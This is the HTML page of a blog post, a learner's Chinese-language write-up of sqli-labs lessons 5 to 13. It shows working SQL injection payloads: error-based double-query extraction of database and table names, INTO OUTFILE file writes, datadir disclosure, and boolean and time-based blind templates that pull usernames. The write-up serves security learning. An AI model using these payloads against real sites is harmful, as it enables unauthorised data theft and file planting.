@@ -1,0 +1,727 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="双查询注入、php反弹shell、hackbar里get、post区别 1个菜b学sql注入的笔记，大佬绕过 前面水了很多，是因为好多基础知识俺8太会。因此到了这里，就8会再水了 lesson_5 双查询注入, 错误回显来返回信息尝试注入, 发现要么报错，要么显示上面的东东 result1: You are in………..result2: You have an error in your SQL">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli_labs 解题笔记(2)">
+<meta property="og:url" content="http://example.com/2021/10/29/sqli-labs-%E8%A7%A3%E9%A2%98%E7%AC%94%E8%AE%B0-2/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="双查询注入、php反弹shell、hackbar里get、post区别 1个菜b学sql注入的笔记，大佬绕过 前面水了很多，是因为好多基础知识俺8太会。因此到了这里，就8会再水了 lesson_5 双查询注入, 错误回显来返回信息尝试注入, 发现要么报错，要么显示上面的东东 result1: You are in………..result2: You have an error in your SQL">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/sqli_labs/sqli_labs.png">
+<meta property="article:published_time" content="2021-10-29T05:33:10.000Z">
+<meta property="article:modified_time" content="2024-03-11T18:12:02.252Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/images/sqli_labs/sqli_labs.png">
+  
+  
+  
+  <title>sqli_labs 解题笔记(2) - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/background1.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="sqli_labs 解题笔记(2)"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2021-10-29 13:33" pubdate>
+          October 29, 2021 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.2k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          10 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">sqli_labs 解题笔记(2)</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>双查询注入、php反弹shell、hackbar里get、post区别</p>
+<p>1个菜b学sql注入的笔记，大佬绕过</p>
+<p>前面水了很多，是因为好多基础知识俺8太会。因此到了这里，就8会再水了</p>
+<h1 id="lesson-5-双查询注入-错误回显来返回信息"><a href="#lesson-5-双查询注入-错误回显来返回信息" class="headerlink" title="lesson_5 双查询注入, 错误回显来返回信息"></a>lesson_5 双查询注入, 错误回显来返回信息</h1><p><img src="/images/sqli_labs/sqli_labs(2).png" srcset="/img/loading.gif" lazyload><br>尝试注入, 发现要么报错，要么显示上面的东东</p>
+<p>result1: You are in………..<br>result2: You have an error in your SQL syntax…..</p>
+<p>所以此处我们要学习1个新的思路，叫利用错误回显来获得信息</p>
+<h2 id="利用错误回显来返回信息-抄作业"><a href="#利用错误回显来返回信息-抄作业" class="headerlink" title="利用错误回显来返回信息(抄作业)"></a>利用错误回显来返回信息(抄作业)</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><p>举例: 一个阔以在报错回显里获得当前数据库的语句:</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),<span class="hljs-number">2</span>,concat(<span class="hljs-string">&#x27;:&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-built_in">floor</span>(rand()*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a#<br></code></pre></td></tr></table></figure>
+<p>大概意思就是根据报错来回显信息，这得搓代码多少年才能想到这个…会用就行了……<br>attention: 由于rand()函数的随机性，需要多次刷新，会得到下图结果<br><img src="/images/sqli_labs/sqli_labs(3).png" srcset="/img/loading.gif" lazyload><br>获得当前database: security  <del>可恶，是幻术</del><br>然后把上述语句的database()换成user()，刷新几次，获得当前user<br>再获得table_name以及其他信息:</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),<span class="hljs-number">2</span>,concat(<span class="hljs-string">&#x27;:&#x27;</span>,(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>),<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-built_in">floor</span>(rand()*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a-- <br></code></pre></td></tr></table></figure>
+<p>刷新几次后….</p>
+<p><img src="/images/sqli_labs/sqli_labs(3).png" srcset="/img/loading.gif" lazyload></p>
+<p>0hhhhhhhhhhhhhhhh!!!!!!!</p>
+<h1 id="lesson-7-文件反弹shell"><a href="#lesson-7-文件反弹shell" class="headerlink" title="lesson_7 文件反弹shell"></a>lesson_7 文件反弹shell</h1><p>首先，盲注</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27;-- <span class="hljs-built_in">error</span><br>?<span class="hljs-attribute">id</span>=1&quot;-- 正常<br>?<span class="hljs-attribute">id</span>=1&#x27;)-- <span class="hljs-built_in">error</span><br>?<span class="hljs-attribute">id</span>=1&#x27;))-- 正常，返回结果: You are <span class="hljs-keyword">in</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span> Use outfile<span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><br></code></pre></td></tr></table></figure>
+
+<p>(ps: 所以有时候括号要闭合好几次啊)</p>
+<p>根据返回结果可知，这又是个错误回显注入，然后尝试用双查询、updatexml()等各种错误回显，发现8行，错误回显没有数据</p>
+<p>网上搜索可知，这里根据回显结果’Use outfile’提示，要用到php反弹shell，原理见俺另一个记录sql注入姿势原理的博客</p>
+<p>于是我们就阔以构造: </p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/?<span class="hljs-attribute">id</span>=-1&#x27;)) union select group_concat(username) <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>into outfile <span class="hljs-string">&#x27;F:/shit.txt&#x27;</span>-- <br></code></pre></td></tr></table></figure>
+<p>于是，就报错了</p>
+<p>因为mysql在配置文件里限制了导出文件的路径，既然如此，就要知道这个路径</p>
+<p>为此我们要用到这个: datadir、basedir(具体原理见俺另一个记录sql注入姿势原理的博客)</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> @<span class="hljs-variable">@datadir</span>,@<span class="hljs-variable">@basedir</span><span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure>
+
+<p>投个机，在第一关试试:<br><img src="/images/sqli_labs/sqli_labs(6).png" srcset="/img/loading.gif" lazyload></p>
+<p>就知道了</p>
+<p>然后开始构造:<br>.<br>.<br>.</p>
+<p>这关迟迟过不了，太菜了，网上的payload原封不动地上都没反应，阔能是环境错了。还是先学学基础，比如这关要用到的基础知识: <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/86772765">一句话木马</a></p>
+<p>然后周四再去问问210这关咋搞</p>
+<p>后续:<br>今天去210，bw师傅给俺解决了，大致原因是: 首先linux里的路径阔以是’&#x2F;‘也阔以是’&#39;，但windows里则只能是’&#x2F;‘;其次你的secure_file_priv一开始的值是”NULL”，mysql里NULL和空是2个概念，俺的理解就是:NULL表示没有，空表示没有限制，想是啥都行<br><img src="/images/sqli_labs/sqli_labs(8).png" srcset="/img/loading.gif" lazyload></p>
+<p>如图，虽然报错，但是生成了文件，记得以后路径要用’&#x2F;‘</p>
+<h1 id="lesson-8-我超，盲注"><a href="#lesson-8-我超，盲注" class="headerlink" title="lesson_8 我超，盲注"></a>lesson_8 我超，盲注</h1><p>所谓盲注，就是在注入过程中数据不能回显到前端页面，全靠猜，猜对和猜错的回显8一样(所以叫布尔)</p>
+<p>而又因为全靠猜，所以得搓脚本</p>
+<p>具体的分类以及姿势，写在另一个博客里了</p>
+<p>到这里就要再学一些函数了</p>
+<p>操作:</p>
+<p>首先判断你要查的东东的名字长度, 比如数据库:</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable"><span class="hljs-keyword">and</span></span> (<span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">length</span></span>(<span class="hljs-title">database</span>())=<span class="hljs-number">8</span>)-- </span><br></code></pre></td></tr></table></figure>
+<p>比如mysql版本(一般是4或5):</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">and</span> substring(@@version,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-number">5</span> --<br></code></pre></td></tr></table></figure>
+<p>然后就通过ascii一个一个猜</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">and (<span class="hljs-name">ascii</span>(<span class="hljs-name">substr</span>(<span class="hljs-name">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=115) -- <br></code></pre></td></tr></table></figure>
+
+<p>此处自然是要写脚本，之前学的爬虫排上用场了，可是俺的Python在装双环境时出问题了，一直没解决….</p>
+<p>但是还有burp和sqlmap阔以用，过了</p>
+<h2 id="lesson-9-时间盲注"><a href="#lesson-9-时间盲注" class="headerlink" title="lesson_9 时间盲注"></a>lesson_9 时间盲注</h2><p>此处的特点是，无论后面拼接的语句是否正确，都只会返回同样的结果: You are in….</p>
+<p>而布尔盲注一般会返回2个结果，所以此关要用到时间盲注</p>
+<p>eg:</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(length(substr((<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> &#123;&#125;,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>))=&#123;&#125;,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">-- </span><br><span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ascii(substr((<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> &#123;&#125;,<span class="hljs-number">1</span>),&#123;&#125;,<span class="hljs-number">1</span>))=&#123;&#125;,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+
+
+<h1 id="lesson-13-基于报错的布尔盲注"><a href="#lesson-13-基于报错的布尔盲注" class="headerlink" title="lesson_13 基于报错的布尔盲注"></a>lesson_13 基于报错的布尔盲注</h1><p>本关闭合错误会有回显，但闭合正确了啥都不显示(比如输入Dumb、Dumb分别为username、password，不会回显)</p>
+<p>同时正确闭合后时间盲注也没卵用<br>同时这个也没卵用</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable"><span class="hljs-keyword">and</span></span> <span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">length</span></span>(<span class="hljs-title">database</span>()=<span class="hljs-number">18</span>))</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/sqli_labs/sqli_labs(7).png" srcset="/img/loading.gif" lazyload><br>但是，基于报错的布尔盲注是有用的!!(因为人家会返回报错)</p>
+<h1 id="add-关于hackbar里post和get传参的区别"><a href="#add-关于hackbar里post和get传参的区别" class="headerlink" title="add: 关于hackbar里post和get传参的区别"></a>add: 关于hackbar里post和get传参的区别</h1><p>我草….来回几遍以为是语法错误检查不出来，后来才发现hackbar在post传参时是要用url码的…..</p>
+<p>比如: 在get传参时，可以用’– ‘来表示注释，但在post传参里则必须为’–+’</p>
+<p>而如果在post里不用url码，则会出现以下结果:</p>
+<p><img src="/images/sqli_labs/sqli_labs(4).png" srcset="/img/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/%E5%9F%BA%E7%A1%80/" class="category-chain-item">基础</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/web/" class="print-no-link">#web</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>sqli_labs 解题笔记(2)</div>
+      <div>http://example.com/2021/10/29/sqli-labs-解题笔记-2/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 29, 2021</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/11/19/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A&amp;%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" title="目录穿越&amp;文件包含漏洞">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">目录穿越&amp;文件包含漏洞</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/10/27/sqli-labs-%E8%A7%A3%E9%A2%98%E7%AC%94%E8%AE%B0-1/" title="sqli_lab 解题笔记(1)">
+                        <span class="hidden-mobile">sqli_lab 解题笔记(1)</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
